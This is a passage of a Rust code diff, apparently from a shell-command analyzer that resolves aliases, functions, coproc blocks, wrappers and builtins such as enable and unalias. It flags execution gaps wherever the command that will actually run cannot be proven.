+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    return;
+                }
+                break;
+            }
+            push_static_child_from(args, index, shell, scan);
+        }
+        "taskset" => {
+            let mut pid_mode = false;
+            while index < args.len() {
+                let Some(option) = static_wrapper_word(&args[index], shell) else {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    return;
+                };
+                if option == "--" {
+                    index += 1;
+                    break;
+                }
+                if matches!(option.as_str(), "-a" | "--all-tasks" | "-c" | "--cpu-list") {
+                    index += 1;
+                    continue;
+                }
+                if matches!(option.as_str(), "-p" | "--pid") {
+                    pid_mode = true;
+                    index += 1;
+                    continue;
+                }
+                if matches!(option.as_str(), "-h" | "-V" | "--help" | "--version") {
+                    return;
+                }
+                if option.starts_with('-') {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    return;
+                }
+                break;
+            }
+            if pid_mode {
+                return;
+            }
+            if index < args.len() {
+                index += 1; // CPU mask/list
+            }
+            push_static_child_from(args, index, shell, scan);
+        }
+        "ionice" | "flock" if !args.is_empty() => {
+            // Both utilities have overlapping query/modify/execute modes and
+            // platform-specific option grammars. Preserve a typed block until
+            // their mode can be proven instead of guessing a child index.
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        }
+        _ => {}
+    }
+}
+
+fn scan_posix_coproc(args: &[String], shell: ShellType, scan: &mut ExecutableSubstitutionScan) {
+    let compound = args.iter().enumerate().find_map(|(index, arg)| {
+        match crate::rules::command::normalize_shell_token(arg, shell).as_str() {
+            "{" => Some((index, "}")),
+            "(" => Some((index, ")")),
+            _ => None,
+        }
+    });
+    let Some((open, closing)) = compound else {
+        push_control_prefix_body(args, shell, scan);
+        return;
+    };
+    if args[..open]
+        .iter()
+        .any(|arg| static_wrapper_word(arg, shell).is_none())
+    {
+        record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        return;
+    }
+    let close = args
+        .iter()
+        .enumerate()
+        .skip(open + 1)
+        .find_map(|(index, arg)| {
+            (crate::rules::command::normalize_shell_token(arg, shell) == closing).then_some(index)
+        });
+    let Some(close) = close else {
+        record_shell_execution_gap(scan, ShellExecutionGap::IncompleteExecutableBody);
+        return;
+    };
+    push_control_prefix_body(&args[open + 1..close], shell, scan);
+}
+
+fn shell_alias_name(raw: &str, shell: ShellType) -> Option<String> {
+    if raw.is_empty() {
+        return None;
+    }
+    if shell == ShellType::Posix {
+        return raw
+            .chars()
+            .all(|ch| {
+                !matches!(
+                    ch,
+                    '\0' | '/'
+                        | '$'
+                        | '`'
+                        | '='
+                        | '|'
+                        | '&'
+                        | ';'
+                        | '('
+                        | ')'
+                        | '<'
+                        | '>'
+                        | ' '
+                        | '\t'
+                        | '\n'
+                        | '\\'
+                        | '\''
+                        | '"'
+                )
+            })
+            .then(|| raw.to_string());
+    }
+    raw.chars()
+        .all(|ch| ch == '_' || ch == '-' || ch.is_ascii_alphanumeric())
+        .then(|| raw.to_string())
+}
+
+fn posix_alias_invocation_name(raw: &str) -> Option<String> {
+    let bytes = raw.as_bytes();
+    let mut joined = String::with_capacity(raw.len());
+    let mut index = 0usize;
+    while index < bytes.len() {
+        if bytes[index] == b'\\' {
+            if bytes.get(index + 1) == Some(&b'\n') {
+                index += 2;
+                continue;
+            }
+            return None;
+        }
+        if matches!(bytes[index], b'\'' | b'"') {
+            return None;
+        }
+        let ch = raw.get(index..)?.chars().next()?;
+        joined.push(ch);
+        index += ch.len_utf8();
+    }
+    shell_alias_name(&joined, ShellType::Posix)
+}
+
+const MAX_LITERAL_ALIAS_EXPANSIONS: usize = 8;
+const MAX_LITERAL_ALIAS_REWRITES: usize = 128;
+const MAX_LITERAL_ALIAS_REWRITE_GROWTH: usize = 256 * 1024;
+
+#[derive(Clone, Default)]
+struct LiteralAliasState {
+    aliases: std::collections::HashMap<String, String>,
+    unresolved: std::collections::HashSet<String>,
+}
+
+fn posix_segment_uses_reserved_time(segment: &tokenize::Segment) -> bool {
+    let Some(leader_raw) = segment.command.as_deref() else {
+        return false;
+    };
+    let first_word = segment
+        .raw
+        .as_bytes()
+        .iter()
+        .position(|byte| !matches!(byte, b' ' | b'\t' | b'\n'))
+        .and_then(|start| {
+            posix_shell_word_end(&segment.raw, start).and_then(|end| segment.raw.get(start..end))
+        });
+    is_strict_posix_reserved_word(leader_raw, "time")
+        && first_word.is_some_and(|word| is_strict_posix_reserved_word(word, "time"))
+        && !matches!(segment.preceding_separator.as_deref(), Some("|" | "|&"))
+}
+
+fn posix_current_scope_dispatch_scan(
+    segment: &tokenize::Segment,
+) -> Option<ExecutableSubstitutionScan> {
+    let leader_raw = segment.command.as_deref()?;
+    let leader = Some(leader_raw).and_then(|command| {
+        crate::rules::command::command_word_is_statically_bound(command, ShellType::Posix)
+            .then(|| crate::rules::command::normalize_cmd_base(command, ShellType::Posix))
+    })?;
+    let reserved_time = leader == "time" && posix_segment_uses_reserved_time(segment);
+    if reserved_time {
+        let mut index = 0usize;
+        if segment
+            .args
+            .get(index)
+            .is_some_and(|option| is_strict_posix_reserved_word(option, "-p"))
+        {
+            index += 1;
+        }
+        if segment
+            .args
+            .get(index)
+            .is_some_and(|option| is_strict_posix_reserved_word(option, "--"))
+        {
+            index += 1;
+        }
+        let mut scan = ExecutableSubstitutionScan::default();
+        push_control_prefix_body(
+            segment.args.get(index..).unwrap_or_default(),
+            ShellType::Posix,
+            &mut scan,
+        );
+        return Some(scan);
+    }
+
+    let case_arm = leader.ends_with(')') && !leader.ends_with("()");
+    let strict_syntax_leader = matches!(
+        leader.as_str(),
+        "if" | "then" | "elif" | "else" | "while" | "until" | "do" | "!" | "case" | "coproc"
+    );
+    if strict_syntax_leader && !is_strict_posix_reserved_word(leader_raw, &leader) {
+        return None;
+    }
+    if matches!(leader.as_str(), "command" | "builtin") {
+        let target = segment.args.iter().find_map(|word| {
+            let word = static_wrapper_word(word, ShellType::Posix)?;
+            (!word.starts_with('-')).then_some(word)
+        });
+        if target.as_deref() != Some("eval") {
+            return None;
+        }
+    }
+    if !case_arm
+        && !matches!(
+            leader.as_str(),
+            "if" | "then"
+                | "elif"
+                | "else"
+                | "while"
+                | "until"
+                | "do"
+                | "!"
+                | "case"
+                | "coproc"
+                | "eval"
+                | "builtin"
+                | "command"
+        )
+    {
+        return None;
+    }
+    let mut scan = ExecutableSubstitutionScan::default();
+    scan_literal_shell_wrappers(&segment.raw, ShellType::Posix, &mut scan);
+    Some(scan)
+}
+
+fn posix_body_calls_parent_alias(
+    raw: &str,
+    state: &LiteralAliasState,
+    depth: usize,
+    remaining_bodies: &mut usize,
+) -> bool {
+    for segment in tokenize::tokenize(raw, ShellType::Posix) {
+        if let Some(command_raw) = segment.command.as_deref() {
+            if let Some(command) = posix_alias_invocation_name(command_raw) {
+                if state.aliases.contains_key(&command) || state.unresolved.contains(&command) {
+                    return true;
+                }
+            } else if !crate::rules::command::command_word_is_statically_bound(
+                command_raw,
+                ShellType::Posix,
+            ) && (!state.aliases.is_empty() || !state.unresolved.is_empty())
+            {
+                return true;
+            }
+        }
+
+        let (nested_bodies, nested_gap) =
+            lexical_executable_substitutions(&segment.raw, ShellType::Posix);
+        if nested_gap.is_some() && (!state.aliases.is_empty() || !state.unresolved.is_empty()) {
+            return true;
+        }
+        for body in nested_bodies {
+            if *remaining_bodies == 0 || depth >= MAX_SHELL_DELIMITER_DEPTH {
+                return true;
+            }
+            *remaining_bodies -= 1;
+            if posix_body_calls_parent_alias(&body, state, depth + 1, remaining_bodies) {
+                return true;
+            }
+        }
+
+        if let Some(wrapper_scan) = posix_current_scope_dispatch_scan(&segment) {
+            if wrapper_scan.gap.is_some()
+                && (!state.aliases.is_empty() || !state.unresolved.is_empty())
+            {
+                return true;
+            }
+            for body in wrapper_scan.bodies {
+                if *remaining_bodies == 0 || depth >= MAX_SHELL_DELIMITER_DEPTH {
+                    return true;
+                }
+                *remaining_bodies -= 1;
+                if posix_body_calls_parent_alias(&body.input, state, depth + 1, remaining_bodies) {
+                    return true;
+                }
+            }
+        }
+    }
+    false
+}
+
+fn recover_posix_parent_dispatch_body(
+    raw: &str,
+    aliases: &LiteralAliasState,
+    functions: &std::collections::HashMap<String, PosixFunctionBinding>,
+    scan: &mut ExecutableSubstitutionScan,
+) -> Result<bool, ()> {
+    let mut recovered = false;
+    for segment in tokenize::tokenize(raw, ShellType::Posix) {
+        if let Some(command_raw) = segment.command.as_deref() {
+            if let Some(alias_name) = posix_alias_invocation_name(command_raw) {
+                if aliases.unresolved.contains(&alias_name) {
+                    return Err(());
+                }
+                if let Some(value) = aliases.aliases.get(&alias_name) {
+                    let Some(input) = expand_literal_alias_body(
+                        value.clone(),
+                        ShellType::Posix,
+                        &aliases.aliases,
+                        &aliases.unresolved,
+                        scan,
+                    ) else {
+                        return Err(());
+                    };
+                    if !input.trim().is_empty() {
+                        scan.bodies.push(ExecutableBody {
+                            input,
+                            shell: ShellType::Posix,
+                        });
+                    }
+                    recovered = true;
+                    continue;
+                }
+            } else if !crate::rules::command::command_word_is_statically_bound(
+                command_raw,
+                ShellType::Posix,
+            ) && (!aliases.aliases.is_empty()
+                || !aliases.unresolved.is_empty()
+                || !functions.is_empty())
+            {
+                return Err(());
+            }
+        }
+
+        if let Some(command) = posix_function_command_word(&segment) {
+            if let Some(binding) = functions.get(&command) {
+                scan.bodies.push(ExecutableBody {
+                    input: binding.definition.body.clone(),
+                    shell: ShellType::Posix,
+                });
+                recovered = true;
+            }
+        } else if segment.command.is_some() && !functions.is_empty() {
+            return Err(());
+        }
+    }
+    Ok(recovered)
+}
+
+fn alias_command_global_range(segment: &tokenize::Segment) -> Option<std::ops::Range<usize>> {
+    let command = segment.command.as_deref()?;
+    let words = tokenize::split_words(&segment.raw);
+    let command_index = words
+        .iter()
+        .position(|word| !tokenize::is_env_assignment(word))?;
+    if words.get(command_index).map(String::as_str) != Some(command) {
+        return None;
+    }
+
+    let mut cursor = 0usize;
+    for (index, word) in words.iter().enumerate().take(command_index + 1) {
+        let relative = segment.raw.get(cursor..)?.find(word)?;
+        let start = cursor.checked_add(relative)?;
+        let end = start.checked_add(word.len())?;
+        if index == command_index {
+            return Some(
+                segment.byte_range.start.checked_add(start)?
+                    ..segment.byte_range.start.checked_add(end)?,
+            );
+        }
+        cursor = end;
+    }
+    None
+}
+
+fn expand_literal_alias_body(
+    mut body: String,
+    shell: ShellType,
+    aliases: &std::collections::HashMap<String, String>,
+    unresolved: &std::collections::HashSet<String>,
+    scan: &mut ExecutableSubstitutionScan,
+) -> Option<String> {
+    for _ in 0..MAX_LITERAL_ALIAS_EXPANSIONS {
+        let Some(segment) = tokenize::tokenize(&body, shell).into_iter().next() else {
+            return Some(body);
+        };
+        let Some(command_raw) = segment.command.as_deref() else {
+            return Some(body);
+        };
+        let command = if shell == ShellType::Posix {
+            let Some(command) = posix_alias_invocation_name(command_raw) else {
+                if crate::rules::command::command_word_is_statically_bound(command_raw, shell) {
+                    return Some(body);
+                }
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                return None;
+            };
+            command
+        } else {
+            let command = crate::rules::command::normalize_shell_token(command_raw, shell);
+            if command_raw != command {
+                return Some(body);
+            }
+            command
+        };
+        if unresolved.contains(&command) {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            return None;
+        }
+        let Some(replacement) = aliases.get(&command) else {
+            return Some(body);
+        };
+        let command_start = segment.byte_range.start;
+        if body.get(command_start..command_start + command_raw.len()) != Some(command_raw) {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            return None;
+        }
+        body.replace_range(
+            command_start..command_start + command_raw.len(),
+            replacement,
+        );
+    }
+    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+    None
+}
+
+fn posix_alias_builtin_operands(args: &[String], unalias: bool) -> Result<(Vec<String>, bool), ()> {
+    let mut operands = Vec::new();
+    let mut options = true;
+    let mut clear_all = false;
+    for raw in args {
+        let word = static_wrapper_word(raw, ShellType::Posix).ok_or(())?;
+        if options {
+            if word == "--" {
+                options = false;
+                continue;
+            }
+            if let Some(cluster) = word.strip_prefix('-').filter(|cluster| !cluster.is_empty()) {
+                if (!unalias && cluster.chars().all(|option| option == 'p'))
+                    || (unalias && cluster.chars().all(|option| option == 'a'))
+                {
+                    clear_all |= unalias;
+                    continue;
+                }
+            }
+            if word.starts_with('-') && word != "-" {
+                return Err(());
+            }
+            options = false;
+        }
+        operands.push(word);
+    }
+    Ok((operands, clear_all))
+}
+
+fn scan_literal_posix_aliases(raw: &str, shell: ShellType, scan: &mut ExecutableSubstitutionScan) {
+    let segments = tokenize::tokenize(raw, shell);
+    let uncertain_mutations = (shell == ShellType::Posix)
+        .then(|| uncertain_posix_state_mutation_segments(raw, &segments));
+    let mut state = LiteralAliasState::default();
+    let mut function_alias_dependencies = std::collections::HashMap::<String, bool>::new();
+    let mut function_names = std::collections::HashSet::<String>::new();
+    let mut function_bindings = std::collections::HashMap::<String, PosixFunctionBinding>::new();
+    let mut alias_builtin_enabled = Some(true);
+    let mut unalias_builtin_enabled = Some(true);
+    let mut readonly_builtin_enabled = Some(true);
+    let mut unset_builtin_enabled = Some(true);
+    let mut enable_builtin_enabled = Some(true);
+    // Bash expands aliases for a complete physical input line before running
+    // any command on that line. Queue proven mutations until the next newline
+    // so a same-line rebind/unalias cannot mask the alias spelling that Bash
+    // already expanded.
+    let mut pending_state: Option<LiteralAliasState> = None;
+    let mut literal_rewrites = Vec::new();
+    let mut rewrite_failed = false;
+    for (segment_index, segment) in segments.iter().enumerate() {
+        if shell == ShellType::Posix && segment.preceding_separator.as_deref() == Some("\n") {
+            state = pending_state.take().unwrap_or(state);
+        }
+        let mutation_is_uncertain = uncertain_mutations
+            .as_deref()
+            .and_then(|uncertain| uncertain.get(segment_index))
+            .copied()
+            .unwrap_or(false);
+        if mutation_is_uncertain && contains_literal_posix_dispatch_mutation(&segment.raw) {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        }
+
+        if shell == ShellType::Posix {
+            let raw_state_command = segment
+                .command
+                .as_deref()
+                .and_then(posix_alias_invocation_name);
+            let state_command_alias = raw_state_command
+                .as_ref()
+                .is_some_and(|name| state.aliases.contains_key(name));
+            let state_command_unresolved = raw_state_command
+                .as_ref()
+                .is_some_and(|name| state.unresolved.contains(name));
+            if state_command_unresolved {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            } else if !state_command_alias {
+                let builtin_enabled = match posix_current_shell_builtin_invocation(segment) {
+                    Ok(Some(invocation)) => match invocation.command.as_str() {
+                        "readonly" => readonly_builtin_enabled,
+                        "unset" => unset_builtin_enabled,
+                        "enable" => enable_builtin_enabled,
+                        _ => Some(true),
+                    },
+                    Ok(None) => Some(true),
+                    Err(()) => None,
+                };
+                match builtin_enabled {
+                    Some(false) => {}
+                    None => {
+                        record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody)
+                    }
+                    Some(true) => match apply_posix_function_state_command(
+                        segment,
+                        &mut function_bindings,
+                        mutation_is_uncertain,
+                    ) {
+                        Ok(true) => {
+                            function_names = function_bindings.keys().cloned().collect();
+                            function_alias_dependencies
+                                .retain(|name, _| function_names.contains(name));
+                        }
+                        Ok(false) => {}
+                        Err(()) => record_shell_execution_gap(
+                            scan,
+                            ShellExecutionGap::AmbiguousExecutableBody,
+                        ),
+                    },
+                }
+            }
+        }
+
+        if shell == ShellType::Posix {
+            match parse_posix_function_definition(&segment.raw, 0) {
+                PosixFunctionParse::Complete { definition, .. } => {
+                    if !mutation_is_uncertain {
+                        if function_bindings
+                            .get(&definition.name)
+                            .is_some_and(|binding| binding.readonly)
+                        {
+                            continue;
+                        }
+                        let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+                        let depends_on_alias = posix_body_calls_parent_alias(
+                            &definition.body,
+                            &state,
+                            0,
+                            &mut remaining_bodies,
+                        );
+                        function_alias_dependencies
+                            .insert(definition.name.clone(), depends_on_alias);
+                        function_names.insert(definition.name.clone());
+                        function_bindings.insert(
+                            definition.name.clone(),
+                            PosixFunctionBinding {
+                                definition,
+                                readonly: false,
+                            },
+                        );
+                    }
+                    continue;
+                }
+                PosixFunctionParse::Incomplete { .. } => {
+                    record_shell_execution_gap(scan, ShellExecutionGap::IncompleteExecutableBody);
+                    continue;
+                }
+                PosixFunctionParse::NotDefinition => {}
+            }
+
+            let (nested_bodies, nested_gap) =
+                lexical_executable_substitutions(&segment.raw, ShellType::Posix);
+            let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+            if (nested_gap.is_some() && (!state.aliases.is_empty() || !state.unresolved.is_empty()))
+                || nested_bodies.iter().any(|body| {
+                    posix_body_calls_parent_alias(body, &state, 0, &mut remaining_bodies)
+                })
+            {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            }
+
+            if let Some(dispatch_scan) = posix_current_scope_dispatch_scan(segment) {
+                if dispatch_scan.gap.is_some() {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                }
+                let local_mutations_escape = segment
+                    .command
+                    .as_deref()
+                    .map(|command| {
+                        crate::rules::command::normalize_cmd_base(command, ShellType::Posix)
+                            != "coproc"
+                    })
+                    .unwrap_or(true);
+                let dispatch_alias_state = pending_state.as_ref().unwrap_or(&state);
+                for body in &dispatch_scan.bodies {
+                    if local_mutations_escape
+                        && contains_literal_posix_dispatch_mutation(&body.input)
+                    {
+                        record_shell_execution_gap(
+                            scan,
+                            ShellExecutionGap::AmbiguousExecutableBody,
+                        );
+                    }
+                    if recover_posix_parent_dispatch_body(
+                        &body.input,
+                        dispatch_alias_state,
+                        &function_bindings,
+                        scan,
+                    )
+                    .is_err()
+                    {
+                        record_shell_execution_gap(
+                            scan,
+                            ShellExecutionGap::AmbiguousExecutableBody,
+                        );
+                    }
+                }
+            }
+            if is_complete_literal_posix_brace_group(segment, ShellType::Posix) {
+                continue;
+            }
+        }
+        let Some(command_raw) = segment.command.as_deref() else {
+            continue;
+        };
+        let mut command = crate::rules::command::normalize_shell_token(command_raw, shell);
+        let mut alias_args = segment.args.as_slice();
+        let mut wrapped_alias = false;
+        if matches!(command.as_str(), "builtin" | "command") {
+            let wrapper = command.clone();
+            if state.unresolved.contains(&wrapper) {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                continue;
+            }
+            if !state.aliases.contains_key(&wrapper) && !function_names.contains(&wrapper) {
+                wrapped_alias = true;
+                let mut index = 0usize;
+                while index < alias_args.len() {
+                    let Some(word) = static_wrapper_word(&alias_args[index], shell) else {
+                        record_shell_execution_gap(
+                            scan,
+                            ShellExecutionGap::AmbiguousExecutableBody,
+                        );
+                        break;
+                    };
+                    if word == "--" || word.starts_with('-') {
+                        index += 1;
+                        continue;
+                    }
+                    command = word;
+                    alias_args = &alias_args[index + 1..];
+                    break;
+                }
+            }
+        }
+        let command_alias_shadowed = !wrapped_alias
+            && posix_alias_invocation_name(command_raw).is_some_and(|name| {
+                state.aliases.contains_key(&name) || state.unresolved.contains(&name)
+            });
+        let command_function_shadowed = !wrapped_alias && function_names.contains(&command);
+
+        if command_function_shadowed && !command_alias_shadowed {
+            if let Some(binding) = function_bindings.get(&command) {
+                scan.bodies.push(ExecutableBody {
+                    input: binding.definition.body.clone(),
+                    shell: ShellType::Posix,
+                });
+                if posix_function_invocation_needs_context(
+                    raw,
+                    segment.byte_range.start,
+                    &binding.definition.body,
+                    &segments,
+                ) {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                }
+                if recover_posix_parent_dispatch_body(
+                    &binding.definition.body,
+                    &state,
+                    &function_bindings,
+                    scan,
+                )
+                .is_err()
+                {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                }
+            }
+            continue;
+        }
+
+        let enable_invocation = (shell == ShellType::Posix)
+            .then(|| posix_current_shell_builtin_invocation(segment))
+            .transpose()
+            .ok()
+            .flatten()
+            .flatten()
+            .filter(|invocation| invocation.command == "enable");
+        let enable_is_shadowed = enable_invocation.as_ref().is_some_and(|invocation| {
+            command_alias_shadowed
+                || invocation
+                    .lookup_wrappers
+                    .iter()
+                    .any(|wrapper| function_names.contains(wrapper))
+                || (!invocation.bypasses_function_lookup
+                    && (function_names.contains("enable")
+                        || state.aliases.contains_key("enable")
+                        || state.unresolved.contains("enable")))
+        });
+        if let Some(enable_invocation) = enable_invocation.filter(|_| !enable_is_shadowed) {
+            match enable_builtin_enabled {
+                Some(true) => {}
+                Some(false) => continue,
+                None => {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    continue;
+                }
+            }
+
+            let mut disable = false;
+            let mut listing = false;
+            let mut dynamic_builtin_change = false;
+            let mut operands = Vec::new();
+            let mut parse_failed = false;
+            let mut options = true;
+            let mut index = 0usize;
+            while index < enable_invocation.args.len() {
+                let Some(word) =
+                    static_wrapper_word(&enable_invocation.args[index], ShellType::Posix)
+                else {
+                    parse_failed = true;
+                    break;
+                };
+                if options && word == "--" {
+                    options = false;
+                    index += 1;
+                    continue;
+                }
+                if options && word.starts_with('-') && word != "-" {
+                    let flags = word.trim_start_matches('-');
+                    if flags.is_empty()
+                        || !flags
+                            .chars()
+                            .all(|flag| matches!(flag, 'a' | 'd' | 'f' | 'n' | 'p' | 's'))
+                    {
+                        parse_failed = true;
+                        break;
+                    }
+                    disable |= flags.contains('n');
+                    listing |= flags.chars().any(|flag| matches!(flag, 'a' | 'p' | 's'));
+                    dynamic_builtin_change |= flags.chars().any(|flag| matches!(flag, 'd' | 'f'));
+                    if flags.contains('f') {
+                        index += 1;
+                        if index >= enable_invocation.args.len()
+                            || static_wrapper_word(&enable_invocation.args[index], ShellType::Posix)
+                                .is_none()
+                        {
+                            parse_failed = true;
+                            break;
+                        }
+                    }
+                } else {
+                    options = false;
+                    operands.push(word);
+                }
+                index += 1;
+            }
+            let mutates = dynamic_builtin_change || (!operands.is_empty() && (disable || !listing));
+            if parse_failed || dynamic_builtin_change || (mutation_is_uncertain && mutates) {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                alias_builtin_enabled = None;
+                unalias_builtin_enabled = None;
+                readonly_builtin_enabled = None;
+                unset_builtin_enabled = None;
+                enable_builtin_enabled = None;
+            } else if !mutates {
+                // `enable -a/-p/-s [name ...]` and bare `enable -n` only list
+                // state; they do not enable any supplied names.
+            } else {
+                for operand in operands {
+                    match operand.as_str() {
+                        "alias" => alias_builtin_enabled = Some(!disable),
+                        "unalias" => unalias_builtin_enabled = Some(!disable),
+                        "readonly" => readonly_builtin_enabled = Some(!disable),
+                        "unset" => unset_builtin_enabled = Some(!disable),
+                        "enable" => enable_builtin_enabled = Some(!disable),
+                        _ => record_shell_execution_gap(
+                            scan,
+                            ShellExecutionGap::AmbiguousExecutableBody,
+                        ),
+                    }
+                }
+            }
+            continue;
+        }
+        if command == "alias" && !command_alias_shadowed && !command_function_shadowed {
+            match alias_builtin_enabled {
+                Some(true) => {}
+                Some(false) => continue,
+                None => {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    continue;
+                }
+            }
+            if shell == ShellType::Fish && alias_args.len() >= 2 {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            }
+            let alias_operands = if shell == ShellType::Posix {
+                match posix_alias_builtin_operands(alias_args, false) {
+                    Ok((operands, _)) => operands,
+                    Err(()) => {
+                        record_shell_execution_gap(
+                            scan,
+                            ShellExecutionGap::AmbiguousExecutableBody,
+                        );
+                        continue;
+                    }
+                }
+            } else {
+                alias_args
+                    .iter()
+                    .map(|arg| crate::rules::command::normalize_shell_token(arg, shell))
+                    .collect()
+            };
+            let has_mutation = alias_operands
+                .iter()
+                .any(|arg| arg.split_once('=').is_some());
+            if has_mutation && mutation_is_uncertain {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                continue;
+            }
+            for definition in alias_operands {
+                let Some((name_raw, value)) = definition.split_once('=') else {
+                    continue;
+                };
+                let Some(name) = shell_alias_name(name_raw, shell) else {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    continue;
+                };
+                let mutation_state = if shell == ShellType::Posix {
+                    pending_state.get_or_insert_with(|| state.clone())
+                } else {
+                    &mut state
+                };
+                mutation_state
+                    .aliases
+                    .insert(name.clone(), value.to_string());
+                mutation_state.unresolved.remove(&name);
+            }
+            continue;
+        }
+        if command == "unalias" && !command_alias_shadowed && !command_function_shadowed {
+            match unalias_builtin_enabled {
+                Some(true) => {}
+                Some(false) => continue,
+                None => {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    continue;
+                }
+            }
+            if shell != ShellType::Posix {
+                if !alias_args.is_empty() {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                }
+                continue;
+            }
+            let (names, clear_all) = match posix_alias_builtin_operands(alias_args, true) {
+                Ok(parsed) => parsed,
+                Err(()) => {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    continue;
+                }
+            };
+            if (clear_all || !names.is_empty()) && mutation_is_uncertain {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                continue;
+            }
+            let mutation_state = pending_state.get_or_insert_with(|| state.clone());
+            if clear_all {
+                mutation_state.aliases.clear();
+                mutation_state.unresolved.clear();
+            } else {
+                for raw_name in names {
+                    let Some(name) = shell_alias_name(&raw_name, shell) else {
+                        record_shell_execution_gap(
+                            scan,
+                            ShellExecutionGap::AmbiguousExecutableBody,
+                        );
+                        continue;
+                    };
+                    mutation_state.aliases.remove(&name);
+                    mutation_state.unresolved.remove(&name);
+                }
+            }
+            continue;
+        }
+        if function_alias_dependencies
+            .get(&command)
+            .copied()
+            .unwrap_or(false)
+            && (command_raw != command || !state.aliases.contains_key(&command))
+        {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        }
+        let alias_command = if shell == ShellType::Posix {
+            posix_alias_invocation_name(command_raw)
+        } else {
+            (command_raw == command).then(|| command.clone())
+        };
+        let Some(alias_command) = alias_command else {
+            if !crate::rules::command::command_word_is_statically_bound(command_raw, shell) {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            }
+            continue;
+        };
+        if state.unresolved.contains(&alias_command) {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            continue;
+        }
+        if let Some(value) = state.aliases.get(&alias_command) {
+            if literal_rewrites.len() >= MAX_LITERAL_ALIAS_REWRITES {
+                record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                rewrite_failed = true;
+                break;
+            }
+            if let Some(input) = expand_literal_alias_body(
+                value.clone(),
+                shell,
+                &state.aliases,
+                &state.unresolved,
+                scan,
+            )
+            .filter(|input| !input.trim().is_empty())
+            {
+                if input
+                    .as_bytes()
+                    .last()
+                    .is_some_and(|byte| matches!(byte, b' ' | b'\t'))
+                {
+                    if let Some(next_raw) = segment.args.first() {
+                        let next = if shell == ShellType::Posix {
+                            posix_alias_invocation_name(next_raw)
+                        } else {
+                            let normalized =
+                                crate::rules::command::normalize_shell_token(next_raw, shell);
+                            (next_raw.as_str() == normalized).then_some(normalized)
+                        };
+                        // Quoting/escaping suppresses this extra Bash alias
+                        // lookup. A proven plain next word that is itself a
+                        // known or unresolved alias needs stateful argv-range
+                        // rewriting; retain a gap until that exact expansion
+                        // is represented rather than silently treating it as a
+                        // literal curl operand.
+                        if next.as_ref().is_some_and(|next| {
+                            state.aliases.contains_key(next) || state.unresolved.contains(next)
+                        }) {
+                            record_shell_execution_gap(
+                                scan,
+                                ShellExecutionGap::AmbiguousExecutableBody,
+                            );
+                        }
+                    }
+                }
+                // Preserve the invocation's surrounding pipeline/control-flow
+                // context. Replace only the command word so leading environment
+                // assignments and trailing argv keep their exact semantics.
+                let Some(range) = alias_command_global_range(segment) else {
+                    record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+                    rewrite_failed = true;
+                    break;
+                };
+                literal_rewrites.push((range, command_raw.to_string(), input));
+            }
+        } else if !crate::rules::command::command_word_is_statically_bound(command_raw, shell) {
+            // A glob/brace/tilde-shaped command is deterministic only when an
+            // exact alias expansion happens before those later shell phases.
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        }
+    }
+    if rewrite_failed || literal_rewrites.is_empty() {
+        return;
+    }
+
+    literal_rewrites.sort_by_key(|rewrite| std::cmp::Reverse(rewrite.0.start));
+    let Some(max_output) = raw.len().checked_add(MAX_LITERAL_ALIAS_REWRITE_GROWTH) else {
+        record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+        return;
+    };
+    let mut projected = raw.len();
+    let mut upper_bound = raw.len();
+    for (range, expected, replacement) in &literal_rewrites {
+        let valid = range.start <= range.end
+            && range.end <= upper_bound
+            && raw.is_char_boundary(range.start)
+            && raw.is_char_boundary(range.end)
+            && raw.get(range.clone()) == Some(expected.as_str());
+        let Some(next_projected) = projected
+            .checked_sub(range.len())
+            .and_then(|size| size.checked_add(replacement.len()))
+        else {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            return;
+        };
+        if !valid || next_projected > max_output {
+            record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
+            return;
